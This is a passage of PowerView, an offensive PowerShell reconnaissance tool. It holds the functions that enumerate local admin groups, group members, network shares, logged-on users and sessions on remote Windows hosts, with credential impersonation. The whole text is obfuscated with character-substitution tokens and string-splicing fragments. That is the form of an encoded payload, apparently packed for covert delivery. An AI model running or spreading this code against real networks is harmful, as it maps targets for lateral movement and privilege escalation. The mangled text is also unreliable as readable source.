# (with PSReflect).
#
########################################################

function Get-NetLocalGroup {
<#
.SYNOPSIS

Enumerates the local groups on the local (or remote) machine.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: PSReflect  

.DESCRIPTION

This function will enumerate the names and descriptions for the
local groups on the current, or remote, machine. By default, the Win32 API
call NetLocalGroupEnum will be used (for speed). Specifying Zfr-Method WinNTZfr
causes the WinNT service provider to be used instead, which returns group
SIDs along with the group names and descriptions/comments.

.PARAMETER ComputerName

Specifies the hostname to query for sessions (also accepts IP addresses).
Defaults to the localhost.

.PARAMETER Method

The collection method to use, defaults to 41aAPI41a, also accepts 41aWinNT41a.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to a remote machine. Only applicable with Zfr-Method WinNTZfr.

.EXAMPLE

Get-NetLocalGroup

ComputerName                  GroupName                     Comment
------------                  ---------                     -------
WINDOWS1                      Administrators                Administrators have comple...
WINDOWS1                      Backup Operators              Backup Operators can overr...
WINDOWS1                      Cryptographic Operators       Members are authorized to ...
...

.EXAMPLE

Get-NetLocalGroup -Method Winnt

ComputerName           GroupName              GroupSID              Comment
------------           ---------              --------              -------
WINDOWS1               Administrators         S-1-5-32-544          Administrators hav...
WINDOWS1               Backup Operators       S-1-5-32-551          Backup Operators c...
WINDOWS1               Cryptographic Opera... S-1-5-32-569          Members are author...
...

.EXAMPLE

Get-NetLocalGroup -ComputerName '+'primary.testlab.local

ComputerName                  GroupName                     Comment
------------                  ---------                     -------
primary.testlab.local         Administrators                Administrators have comple...
primary.testlab.local         Users                         Users are prevented from m...
primary.testlab.local         Guests                        Guests have the same acces...
primary.testlab.local         Print Operators               Members can administer dom...
primary.testlab.local         Backup Operators              Backup Operators can overr...

.OUTPUTS

PowerView.LocalGroup.API

Custom PSObject with translated group property fields from API results.

PowerView.LocalGroup.WinNT

Custom PSObject with translated group property fields from WinNT results.

.LINK

https://msdn.microsoft.com/en-us/library/windows/desktop/aa370440(v=vs.85).aspx
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41aPSShouldProcess41a, 41a41a)]
    [OutputType(41aPowerView.LocalGroup.API41a)]
    [OutputType(41aPowerView.LocalGroup.WinNT41a)]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = gIF1True, ValueFromPipelineByPropertyName = gIF1True)]
        [Alias(41aHostName41a, 41adnshostname41a, 41aname41a)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        gIF1ComputerName = gIF1Env:COMPUTERNAME,

        [ValidateSet(41aAPI41a, 41aWinNT41a)]
        [Alias(41aCollectionMethod41a)]
        [String]
        gIF1Method = 41aAPI41a,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        gIF1Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if (gIF1PSBoundParameters[41aCredential41a]) {
            gIF1LogonToken = Invoke-UserImpersonation -'+'Credential gIF1Credential
        }
    }

    PROCESS {
        ForEach (gIF1Computer in gIF1ComputerName) {
            if (gIF1Method -eq 41aAPI41a) {
                # if we41are using the Netapi32 NetLocalGroupEnum API call to get the local group information

                # arguments for NetLocalGroupEnum
                gIF1QueryLevel = 1
                gIF1PtrInfo = [IntPtr]::Zero
                gIF1EntriesRead = 0
                gIF1TotalRead = 0
                gIF1ResumeHandle = 0

                # get the local user information
                gIF1Result = gIF1Netapi32::NetLocalGroupEnum(gIF1Computer, gIF1QueryLevel, [ref]gIF1PtrInfo, -1, [ref]gIF1EntriesRead, [ref]gIF1TotalRead, [ref]gIF1ResumeHandle)

                # locate the offset of the initial intPtr
                gIF1Offset = gIF1PtrInfo.ToInt64()

                # 0 = success
                if ((gIF1Result -eq 0) -and (gIF1Offset -gt 0)) {

       '+'             # Work out how much to increment the pointer by finding out the size of the structure
                    gIF1Increment = gIF1LOCALGROUP_INFO_1::GetSize()

                    # parse all the result structures
                    for (gIF1i = 0; (gIF1i -lt gIF1EntriesRead); gIF1i++) {
                        # create a new int ptr at the given offset and cast the pointer as our result structure
                        gIF1NewIntPtr = New-Object System.Intptr -ArgumentList gIF1Offset
                        gIF1Info = gIF1NewIntPtr -as gIF1LOCALGROUP_INFO_1

                        gIF1Offset = gIF1NewIntPtr.ToInt64()
                        gIF1Offset += gIF1Increment

                        gIF1LocalGroup = New-Object PSObject
                        gIF1LocalGroup U9B Add-Member Noteproperty 41aComputerName41a gIF1Computer
                        gIF1LocalGroup U9B Add-Member Noteproperty 41aGroupName41a gIF1Info.lgrpi1_name
                        gIF1LocalGroup U9B Add-Member Noteproperty 41aComment41a gIF1Info.lgrpi1_comment
                        gIF1LocalGroup.PSObject.TypeNames.Insert(0, 41aPowerView.LocalGroup.API41a)
                        gIF1LocalGroup
                    }
                    # fre'+'e up the result buffer
                    gIF1Null = gIF1Netapi32::NetApiBufferFree(gIF1PtrInfo)
                }
                else {
                    Write-Verbose Zfr[Get-NetLocalGroup] Error: gIF1(([ComponentModel.Win32Exception] gIF1Result).Message)Zfr
                }
            }
            else {
                # otherwise we41are using the WinNT service provider
                gIF1ComputerProvider = [ADSI]ZfrWinNT://gIF1Computer,computerZfr

                gIF1ComputerProvider.psbase.children U9B Where-Object { gIF1_.psbase.schemaClassName -eq 41agroup41a } U9B ForEach-Object {
                    gIF1LocalGroup = ([ADSI]gIF1_)
                    gIF1Group = New-Object PSObject
                    gIF1Group U9B Add-Member Noteproperty 41aComputerName41a gIF1Computer
                    gIF1Group U9B Add-Member Noteproperty 41aGroupName41a (gIF1LocalGroup.InvokeGet(41aName41a))
                    gIF1Group U9B Add-Member Noteproperty 41aSID41a ((New-Object System.Security.Principal.SecurityIdentifier(gIF1LocalGroup.InvokeGet(41aobjectsid41a),0)).Value)
                    gIF1Group U9B Add-Member Noteproperty 41aComment41a (gIF1LocalGroup.InvokeGet(41aDescription41a))
                    gIF1Group.PSObject.TypeNames.Insert(0, 41aPowerView.LocalGroup.WinNT41a)
                    gIF1Group
                }
            }
        }
    }
    
    END {
        if (gIF1LogonToken) {
            Invoke-RevertToSelf -TokenHandle gIF1LogonToken
        }
    }
}


function Get-NetLocalGroupMember {
<#
.SYNOPSIS

Enumerates members of a specific local group on the local (or remote) machine.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: PSReflect, Convert-ADName  

.DESCRIPTION

This function will enumerate the members of a specified local group  on the
current, or remote, machine. By default, the Win32 API call NetLocalGroupGetMembers
will be used (for speed). Specifying Zfr-Method WinNTZfr causes the WinNT service provider
to be used instead, which returns a larger amount of information.

.PARAMETER ComputerName

Specifies the hostname to query for sessions (also acce'+'pts IP addresses).
Defaults to the localhost.

.PARAMETER GroupName

The local group name to query for users. If not given, it defaults to ZfrAdministratorsZfr.

.PARAMETER Method

The collection method to use, defaults to 41aAPI41a, also accepts 41aWinNT41a.

'+'
.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to a remote machine. Only applicable with Zfr-Method WinNTZfr.

.EXAMPLE

Get-NetLocalGroupMember U9B ft

ComputerName   GroupName      MemberName     SID                   IsGroup       IsDomain
------------   ---------      ----------     ---                   -------       --------
WINDOWS1       Administrators WINDOWS1YwWAd... S-1-5-21-25...          False          False
WINDOWS1       Administrators WINDOWS1YwWlo... S-1-5-21-25...          False          False
WINDOWS1       Administrators TESTLABYwWDom... S-1-5-21-89...           True           True
WINDOWS1       Administrators TESTLABYwWhar... S-1-5-21-89...          False           True

.EXAMPLE

Get-NetLocalGroupMember -Method winnt U9B ft

ComputerName   GroupName      MemberName     SID                   IsGroup       IsDomain
------------   ---------      ----------     ---                   -------       --------
WINDOWS1       Administrators WINDOWS1YwWAd... S-1-5-21-25...          False          False
WINDOWS1       Administrators WINDOWS1YwWlo... S-1-5-21-25...          False          False
WINDOWS1       Administrators TESTLABYwWDom... S-1-5-21-89...           True           True
WINDOWS1       Administrators TESTLABYwWhar... S-1-5-21-89...          False           True

.EXAMPLE

Get-NetLocalGroup U9B Get-NetLocalGroupMember U9B ft

ComputerName   GroupName      MemberName     SID                   IsGroup       IsDomain
------------   ---------      ----------     ---                   -------       --------
WINDOWS1       Administrators WINDOWS1YwWAd... S-1-5-21-25...          False          False
WINDOWS1       Administrators WINDOWS1YwWlo... S-1-5-21-25...          False          False
WINDOWS1       Administrators TESTLABYwWDom... S-1-5-21-89...           True           True
WINDOWS1       Administrators TESTLABYwWhar... S-1-5-21-89...          False           True
WINDOWS1       Guests         WINDOWS1YwWGuest S-1-5-21-25...          False          False
WINDOWS1       IIS_IUSRS      NT AUTHORIT... S-1-5-17                False          False
WINDOWS1       Users          NT AUTHORIT... S-1-5-4                 False          False
WINDOWS1       Users          NT AUTHORIT... S-1-5-11                False          False
WINDOWS1       Users          WINDOWS1YwWlo... S-1-5-21-25...          False        UNKNOWN
WINDOWS1       Users          TESTLABYwWDom... S-1-5-21-89...           True        UNKNOWN

.EXAMPLE

Get-NetLocalGroupMember -ComputerName primary.testlab.local U9B ft

ComputerName   GroupName      MemberName     SID                   IsGroup       IsDomain
------------   ---------      ----------     ---                   -------       --------
primary.tes... Administrators TESTLABYwWAdm... S-1-5-21-89...          False          False
primary.tes... Administrators TESTLABYwWloc... S-1-5-21-89...          False          False
primary.tes... Administrators TESTLABYwWEnt... S-1-5-21-89...           True          False
primary.tes... Administrators TESTLABYwWDom... S-1-5-21-89...           True          False

.OUTPUTS

PowerView.LocalGroupMember.API

Custom PSObject with translated group property fields from API results.

PowerView.LocalGroupMember.WinNT

Custom PSObject with translated group property fields from WinNT results.

.LINK

http://stackoverflow.com/questions/21288220/get-all-local-members-and-groups-displayed-together
http://msdn.microsoft.com/en-us/library/aa772211(VS.85).aspx
https://msdn.microsoft.com/en-us/library/windows/desktop/aa370601(v=vs.85).aspx
#>

    [Diagnostics.CodeAnalysis.SuppressMessag'+'eAttribute(41aPSShouldProcess41a, 41a41a)]
    [OutputType(41aPowerView.LocalGroupMember.API41a)]
    [OutputType(41aPowerView.LocalGroupMember.WinNT41a)]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = gIF1True, ValueFromPipelineByPropertyName = gIF1True)]
        [Alias(41aHostName41a, 41adnshostname41a, 41aname41a)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        gIF'+'1ComputerName = gIF1Env:COMPUTERNAME,

        [Parameter(ValueFromPipelineByPropertyName = gIF1True)]
        [ValidateNotNullOrEmpty()]
        [String]
        gIF1GroupName = 41aAdministrators41a,

        [ValidateSet(41aAPI41a, 41aWinNT41a)]
        [Alias(41aCollectionMethod41a)]
        [String]
        gIF1Method = 41aAPI41a,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        gIF1Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if (gIF1PSBoundParameters[41aCredential41a]) {
            gIF1LogonToken = Invoke-UserImpersonation -Credential gIF1Credential
        }
    }

    PROCESS {
        ForEach (gIF1Computer in gIF1ComputerName) {
            if (gIF1Method -eq 41aAPI41a) {
                # if we41are using the Netapi32 NetLocalGroupGetMembers API call to get the local group information

                # arguments for NetLocalGroupGetMembers
                gIF1QueryLevel = 2
                gIF1PtrInfo = [IntPtr]::Zero
                gIF1EntriesRead = 0
                gIF1TotalRead = 0
                gIF1ResumeHandle = 0

                # get the local user information
                gIF1Result = gIF1Netapi32::NetLocalGroupGetMembers(gIF1Computer, gIF1GroupName, gIF1QueryLevel, [ref]gIF1PtrInfo, -1, [ref]gIF1EntriesRead, [ref]gIF1TotalRead, [ref]gIF1ResumeHandle)

                # locate the offset of the initial intPtr
                gIF1Offset = gIF1PtrInfo.ToInt64()

                gIF1Members = @()

                # 0 = success
                if ((gIF1Result -eq 0) -and (gIF1Offset -gt 0)) {

                    # Work out how much to increment the pointer by finding out the size of the structure
                    gIF1Increment = gIF1LOCALGROUP_MEMBERS_INFO_2::GetSize()

                    # parse all the result structures
                    for (gIF1i = 0; (gIF1i -lt gIF1EntriesRead); gIF1i++) {
                        # create a new int ptr at the given offset and cast the pointer as our result structure
                        gIF1NewIntPtr = New-Object System.Intptr -ArgumentList gIF1Offset
                        gIF1Info = gIF1NewIntPtr -as gIF1LOCALGROUP_MEMBERS_INFO_2

                        gIF1Offset = gIF1NewIntPtr.ToInt64()
                        gIF1Offset += gIF1Increment

                        gIF1SidString = 41a41a
                        gIF1Result2 = gIF1Advapi32::ConvertSidToStringSid(gIF1Info.lgrmi2_sid, [ref]gIF1SidString);gIF1LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                        if (gIF1Result2 -eq 0) {
                            Write-Verbose Zfr[Get-NetLocalGrou'+'pMember] Error: gIF1(([ComponentModel.Win32Exception] gIF1LastError).Message)Zfr
                        }
                        else {
                        '+'    gIF1Member = New-Object PSObject
                            gIF1Member U9B Add-Member Noteproperty 41aComputerName41a gIF1Computer
                            gIF1Member U9B Add-Member Noteproperty 41aGroupName41a gIF1GroupName
                            gIF1Member U9B Add-Member Noteproperty 41aMemberName41a gIF1Info.lgrmi2_domainandname
                            gIF1Member U9B Add-Member Noteproperty 41aSID41a gIF1SidString
                            gIF1IsGroup = gIF1(gIF1Info.lgrmi2_sidusage -eq 41aSidTypeGroup41a)
                            gIF1Member U9B Add-Member Noteproperty 41aIsGroup41a gIF1IsGroup
                            gIF1Member.PSObject.TypeNames.Insert(0, 41aPowerView.LocalGroupMember.API41a)
                            gIF1Members += gIF1Member
                        }
                    }

                    # free up the result buffer
                    gIF1Null = gIF1Netapi32::NetApiBufferFree(gIF1PtrInfo)

                    # try to extract out the machine SID by using the -500 account as a reference
                    gIF1MachineSid = gIF1Members U9B Where-Object {gIF1_.SID -match 41a.*-50041a -or (gIF1_.SID -match 41a.*-50141a)} U9B Select-Object -Expand SID
                    if (gIF1MachineSid) {
                        gIF1MachineSid = gIF1MachineSid.Substring(0, gIF1MachineSid.LastIndexOf(41a-41a))

                        gIF1Members U9B ForEach-Object {
                            if (gIF1_.SID -match gIF1MachineSid) {
                                gIF1_ U9B Add-Member Noteproperty 41aIsDomain41a gIF1False
                            }
                            else {
                                gIF1_ U9B Add-Member Noteproperty 41aIsDomain41a gIF1True
                            }
                        }
                    }
                    else {
                        gIF1Members U9B ForEach-Object {
                            if (gIF1_.SID -notmatch 41aS-1-5-2141a) {
                                gIF1_ U9B Add-Member Noteproperty 41aIsDomain41a gIF1False
                            }
                            else {
                                gIF1_ U9B Add-Member Noteproperty 41aIsDomain41a 41aUNKNOWN41a
                            }
                        }
                    }
                    gIF1Members
                }
                else {
                    Write-Verbose Zfr[Get-NetLocalGroupMember] Error: gIF1(([ComponentModel.Win32Exception] gIF1Result).Message)Zfr
                }
            }
            else {
                # otherwise we41are using the WinNT service provider
                try {
                    gIF1GroupProvider = [ADSI]ZfrWinNT://gIF1Computer/gIF1GroupName,groupZfr

                    gIF1GroupProvider.psbase.Invoke(41aMembers41a) U9B ForEach-Object {

                        gIF1Member = New-Object PSObject
                        gIF1Member U9B Add-Member Noteproperty 41aComputerName41a gIF1Computer
                        gIF1Member U9B Add-Member Noteproperty 41aGroupName41a gIF1GroupName

                        gIF1LocalUser = ([ADSI]gIF1_)
                        gIF1AdsPath = gIF1LocalUser.InvokeGet(41aAdsPath41a).Replace(41aWinNT://41a, 41a41a)
                        gIF1IsGroup = (gIF1LocalUser.SchemaClassName -like 41agroup41a)

                        if(([regex]::Matches(gIF1AdsPath, 41a/41a)).count -eq 1) {
                            # DOMAINYwWuser
                            gIF1MemberIsDomain = gIF1True
                            gIF1Name = gIF1AdsPath.Replace(41a/41a, 41aYwW41a)
                        }
                        else {
                            # DOMAINYwWmachineYwWuser
                            gIF1MemberIsDomain = gIF1False
                            gIF1Name = gIF1AdsPath.Substring(gIF1AdsPath.IndexOf(41a/41a)+1).Replace(41a/41a, 41aYwW41a)
                        }

                        gIF1Member U9B Add-Member Noteproperty 41aAccountName41a gIF1Name
                        gIF1Member U9B Add-Member Noteproperty 41aSID41a ((New-Object System.Security.Principal.SecurityIdentifier(gIF1LocalUser.InvokeGet(41aObjectSID41a),0)).Value)
                        gIF1Member U9B Add-Member Noteproperty 41aIsGroup41a gIF1IsGroup
                        gIF1Member U9B Add-Member Noteproperty 41aIsDomain41a gIF1MemberIsDomain

                        # if (gIF1MemberIsDo'+'main) {
                        #     # translate the binary sid to a string
                        #     gIF1Member U9B Add-Member Noteproperty 41aSID41a ((New-Object System.Security.Principal.SecurityIdentifier(gIF1LocalUser.InvokeGet(41aObjectSID41a),0)).Value)
                        #     gIF1Member U9B Add-Member Noteproperty 41aDescription41a 41a41a
                        #     gIF1Member U9B Add-Member Noteproperty 41aDisabled41a 41a41a

                        #     if (gIF1IsGroup) {
                        #         gIF1Member U9B Add-Member Noteproperty 41aLastLogin41a 41a41a
                        #     }
                        #     else {
                        #         try {
                        #             gIF1Member U9B Add-Member Noteproperty 41aLastLogin41a gIF1LocalUser.InvokeGet(41aLastLogin41a)
                        #         }
                        #         catch {
                        #             gIF1Member U9B Add-Member Noteproperty 41aLastLogin41a 41a41a
                        #         }
                        #     }
     '+'                   #     gIF1Member U9B Add-Member Noteproperty 41aPwdLastSet41a 41a41a
                        #     gIF1Member U9B Add-Member Noteproperty 41aPwdExpired41a 41a41a
                        #     gIF1Member U9B Add-Member Noteproperty 41aUserFlags41a 41a41a
                        # }
                        # else {
                        #     # translate the binary sid to a string
                        #     gIF1Member U9B Add-Member Noteproperty 41aSID41a ((New-Object System.Security.Principal.SecurityIdentifier(gIF1LocalUser.In'+'vokeGet(41aObjectSID41a),0)).Value)
                        #     gIF1Member U9B Add-Member Noteproperty 41aDescription41a (gIF1LocalUser.Description)

                        #     if (gIF1IsGroup) {
                        #         gIF1Member U9B Add-Member Noteproperty 41aPwdLastSet41a 41a41a
                        #         gIF1Member U9B Add-Member Noteproperty 41aPwdExpired41a 41a41a
                        #         gIF1Member U9B Add-Member Noteproperty 41aUserFlags41a 41a41a
                        #         gIF1Member U9B Add-Member Noteproperty 41aDisabled41a 41a41a
                        #         gIF1Member U9B Add-Member Noteproperty 41aLastLogin41a 41a41a
                        #     }
                        #     else {
                        #         gIF1Member U9B Add-Member Noteproperty 41aPwdLastSet41a ( (Get-Date).AddSeconds(-gIF1LocalUser.PasswordAge[0]))
                        #         gIF1Member U9B Add-Member Noteproperty 41aPwdExpired41a ( gIF1LocalUser.PasswordExpired[0] -eq 41a141a)
                        #         gIF1Member U9B Add-Member Noteproperty 41aUserFlags41a ( gIF1LocalUser.UserFlags[0] )
                        #         # UAC flags of 0x2 mean the account is disabled
                        #         gIF1Member U9B Add-Member Noteprope'+'rty 41aDisabled41a gIF1((gIF1LocalUser.UserFlags.value -band 2) -eq 2)
                        #         try {
                        #             gIF1Member U9B Add-Member Noteproperty 41aLastLogin41a ( gIF1LocalUser.LastLogin[0])
                        #         }
                        #         catch {
                        #             gIF1Member U9B Add-Member Noteproperty 41aLastLogin41a 41a41a
                        #         }
                        #     }
                        # }

                        gIF1Member
                    }
                }
                catch {
                    Write-Verbose Zfr[Get-NetLocalGroupMember] Error for gIF1Computer : gIF1_Zfr
                }
            }
        }
    }
    
    END {
        if (gIF1LogonToken) {
            Invoke-RevertToSelf -TokenHandle gIF1LogonToken
        }
    }
}


function Get-NetShare {
<#
.SYNOPSIS

Returns open shares on the local (or a remote) machine.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: PSReflect, Invoke-UserImpersonation, Invoke-RevertToSelf  

.DESCRIPTION

This function will execute the NetShareEnum Win32API call to query
a given host for open shares. This is a replacement for Zfrnet share YwWYwWhostnameZfr.

.PARAMETER ComputerName

Specifies the hostname to query for shares (also accepts IP addresses).
Defaults to 41alocalhost41a.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the remote system using Invoke-UserImpersonation.

.EXAMPLE

Get-NetShare

Returns active shares on the local host.

.EXAMPLE

Get-NetShare -ComputerName sqlserver

Returns active shares on the 41asqlserver41a host

.EXAMPLE

Get-DomainComputer U9B Get-NetShare

Returns all shares for all computers in the domain.

.EXAMPLE

gIF1SecPassword = ConvertTo-SecureString 41aPassword123!41a -AsPlainText -Force
gIF1Cred = New-Object System.Management.Automation.PSCredential(41aTESTLABYwWdfm.a41a, gIF1SecPassword)
Get-NetShare -ComputerName sqlserver -Credential gIF1Cred

.OUTPUTS

PowerView.ShareInfo

A PSCustomObject representing a SHARE_INFO_1 structure, including
the name/type/remark for each shar'+'e, with the ComputerName added.

.LINK

http://www.powershellmagazine.com/2014/09/25/easily-defining-enums-structs-and-win32-functions-in-memory/
#>

    [OutputType(41aPowerView.ShareInfo41a)]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = gIF1True, ValueFromPipelineByPropertyName = gIF1True)]
        [Alias(41aHostName41a, 41adnshostname41a, 41aname41a)]
        [ValidateNotN'+'ullOrEmpty()]
        [String[]]
        gIF1ComputerName = 41alocalhost41a,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        gIF1Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if (gIF1PSBoundParameters[41aCredential41a]) {
            gIF1LogonToken = Invoke-UserImpersonation -Credential gIF1Credential
        }
    }

    PROCESS {
        ForEach (gIF1Computer in gIF1ComputerName) {
            # arguments for NetShareEnum
            gIF1QueryLevel = 1
            gIF1PtrInfo = [IntPtr]::Zero
            gIF1EntriesRead = 0
         '+'   gIF1TotalRead = 0
            gIF1ResumeHandle = 0

            # get the raw share information
            gIF1Result = gIF1Netapi32::NetShareEnum(gIF1Computer, gIF1QueryLevel, [ref]gIF1PtrInfo, -1, [ref]gIF1EntriesRead, [ref]gIF1TotalRead, [ref]gIF1ResumeHandle)

            # locate the offset of the initial intPtr
            gIF1Offset = gIF1PtrInfo.ToInt64()

            # 0 = success
            if ((gIF1Result -eq 0) -and (gIF1Offset -gt 0)) {

                # work out how much to increment the pointer by finding out the size of the structure
                gIF1Increment = gIF1SHARE_INFO_1::GetSize()

                # parse all the result structures
                for (gIF1i = 0; (gIF1i -lt gIF1EntriesRead); gIF1i++) {
                    # create a new int ptr at the given offset and cast the pointer as our result structure
                    gIF1NewIntPtr = New-Object System.Intptr -ArgumentList gIF1Offset
                    gIF1Info = gIF1NewIntPtr -as gIF1SHARE_INFO_1

                    # return all the sections of the structure - have to do it this way for V2
                    gIF1Share = gIF1Info U9B Select-Object *
                    gIF1Share U9B Add-Member Noteproperty 41aComputerName41a gIF1Computer
                    gIF1Share.PSObject.TypeNames.Insert(0, 41aPowerView.ShareInfo41a)
                    gIF1Offset = gIF1NewIntPtr.ToInt64()
                    gIF1Offset += gIF1Increment
                    gIF1Share
                }

                # free up the result buffer
                gIF1Null = gIF1Netapi32::NetApiBufferFree(gIF1PtrInfo)
            }
            else {
                Write-Verbose Zfr[Get-NetShare] Error: gIF1(([ComponentModel.Win32Exception] gIF1Result).Message)Zfr
            }
        }
    }

    END {
        if (gIF1LogonToken) {
            Invoke-RevertToSelf -TokenHandle gIF1LogonToken
        }
    }
}


function Get-NetLoggedon {
<#
.SYNOPSIS

Returns users logged on the local (or a remote) machi'+'ne.
Note: administrative rights needed for newer Windows OSes.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: PSReflect, Invoke-UserImpersonation, Invoke-RevertToSelf  

.DESCRIPTION

This function will execute the NetWkstaUserEnum Win32API call to query
a given host for actively logged on users.

.PARAMETER ComputerName

Specifies the hostname to query for logged on users (also accepts IP addresses).
Defaults to 41alocalhost41a.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the remote system using Invoke-UserImpersonation.

.EXAMPLE

Get-NetLoggedon

Returns users actively logged onto the local host.

.EXAMPLE

Get-NetLoggedon -ComputerName sqlserver

Returns users actively logged onto the 41asqlserver41a host.

.EXAMPLE

Get-DomainComputer U9B Get-NetLoggedon

Returns all logged on users for all computers in the domain.

.EXAMPLE

gIF1SecPassword = ConvertTo-SecureString 41aPassword123!41a -AsPlainText -Force
gIF1Cred = New-Object System.Management.Automation.PSCredential(41aTESTLABYwWdfm.a41a, gIF1SecPassword)
Get-NetLoggedon -ComputerName sqlserver -Credential gIF1Cred

.OUTPUTS

PowerView.LoggedOnUserInfo

A PSCustomObject representing a WKSTA_USER_INFO_1 structure, including
the UserName/LogonDomain/AuthDomains/LogonServer for each user, with the ComputerName added.

.LINK

http://www.powershellmagazine.com/2014/09/25/easily-defining-enums-structs-and-win32-functions-in-memory/
#>

    [OutputType(41aPowerView.LoggedOnUserInfo41a)]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = gIF1True, ValueFromPipelineByPropertyName = gIF1True)]
        [Alias(41aHostName41a, 41adnshostname41a, 41aname41a)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        gIF1ComputerName = 41alocalhost41a,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        gIF1Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if (gIF1PSBoundParameters[41aCredential41a]) {
            gIF1LogonToken = Invoke-UserImpersonation -Credential gIF1Credential
        }
    }

    PROCESS {
        ForEach (gIF1Computer in gIF1ComputerName) {
            # declare the reference variables
            gIF1QueryLevel = 1
            gIF1PtrInfo = [IntPtr]::Zero
            gIF1EntriesRead = 0
            gIF1TotalRead = 0
            gIF1ResumeHandle = 0

            # get logged on user information
            gIF1Result = gIF1Netapi32::NetWkstaUserEnum(gIF1Computer, gIF1QueryLevel, [ref]gIF1PtrInfo, -1, [ref]gIF1EntriesRead, [ref]gIF1TotalRead, [ref]gIF1ResumeHandle)

            # locate the offset of the initial intPtr
            gIF1Offset = gIF1PtrInfo.ToInt64()

            # 0 = success
            if ((gIF1Result -eq 0) -and (gIF1Offset -gt 0)) {

                # work out how much to increment the pointer by finding out the size of the structure
                gIF1Increment = gIF1WKSTA_USER_INFO_1::GetSize()

                # parse all the result structures
                for (gIF1i = 0; (gIF1i -lt gIF1EntriesRead); gIF1i++) {
                    # create a new int ptr at the given offset and cast the pointer as our result structure
                    gIF1NewIntPtr = New-Object System.Intptr -ArgumentList gIF1Offset
                    gIF1Info = gIF1NewIntPtr -as gIF1WKSTA_USER_INFO_1

                    # return all the sections of the structure - have to do it this way for V2
                    gIF1LoggedOn = gIF1Info U9B Select-Object *
                    gIF1LoggedOn U9B Add-Member Noteproperty 41aComputerName41a gIF1Computer
                    gIF1LoggedOn.PSObject.TypeNames.Insert(0, 41aPowerView.LoggedOnUserInfo41a)
                    gIF1Offset = gIF1NewIntPtr.ToInt64()
                    gIF1Offset += gIF1Increment
                    gIF1LoggedOn
                }

                # free up the result buffer
                gIF1Null = gIF1Netapi32::NetApiBufferFree(gIF1PtrInfo)
            }
            else {
                Write-Verbose Zfr[Get-NetLoggedon] Error: gIF1(([ComponentModel.Win32Exception] gIF1Result).Message)Zfr
            }
        }
    }

    END {
        if (gIF1LogonToken) {
            Invoke-RevertToSelf -TokenHandle gIF1LogonToken
        }
    }
}


function Get-NetSession {
<#
.SYNOPSIS

Returns session information for the local (or a remote) machine.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: PSReflect, Invoke-UserImpersonation, Invoke-RevertToSelf  

.DESCRIPTION

This function'+' will execute the NetSessionEnum Win32API call to query
a given host for active sessions.

.PARAMETER ComputerName

Specifies the hostname to query for sessions (also accepts IP addresse'+'s).
Defaults to 41alocalhost41a.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the remote system using Invoke-UserImpersonation.

.EXAMPLE

Get-NetSession

Returns active sessions on the local host.

.EXAMPLE

Get-NetSession -ComputerName sqlserver

Returns active sessions on the 41asqlserver41a host.

.EXAMPLE

Get-DomainController U9B Get-NetSession

Returns active sessions on all domain controllers.

.EXAMPLE

gIF1SecPassword = ConvertTo-SecureString 41aPassword123!41a -AsPlainText -Force
gIF1Cred = New-Object System.Management.Automation.PSCredential(41aTESTLABYwWdfm.a41a, gIF1SecPassword)
Get-NetSession -ComputerName sqlserver -Credential gIF1Cred

.OUTPUTS

PowerView.SessionInfo

A PSCustomObject representing a WKSTA_USER_INFO_1 structure, including
the CName/UserName/Time/IdleTime for each session, with the ComputerName added.

.LINK

http://www.powershellmagazine.com/2014/09/25/easily-defining-enums-structs-and-win32-functions-in-memory/
#>

    [OutputType(41aPowerView.SessionInfo41a)]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = gIF1True, ValueFromPipelineByPropertyName = gIF1True)]
        [Alias(41aHostName41a, 41adnshostname41a, 41aname41a)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        gIF1ComputerName = 41alocalhost41a,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        gIF1Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if (gIF1PSBoundParameters[41aCredential41a]) {
            gIF1LogonToken = Invoke-UserImpersonation -Credential gIF1Credential
        }
    }

    PROCESS {
        ForEach (gIF1Computer in gIF1ComputerName) {
            # arguments for NetSessionEnum
            gIF1QueryLevel = 10
            gIF1PtrInfo = [IntPtr]::Zero
            gIF1EntriesRead = 0
            gIF1TotalRead = 0
            gIF1ResumeHandle = 0

            # get session information
            gIF1Result = gIF1Netapi32::NetSessionEnum(gIF1Computer, 41a41a, gIF1UserName, gIF1QueryLevel, [ref]gIF1PtrInfo, -1, [ref]gIF1EntriesRead, [ref]gIF1TotalRead, [ref]gIF1ResumeHandle)

            # locate the offset of the initial intPtr
            gIF1Offset = gIF1PtrInfo.ToInt64()

            # 0 = success
            if ((gIF1Result -eq 0) -and (gIF1Offset -gt 0)) {

                # work out how much to increment the pointer by finding out the size of the structure
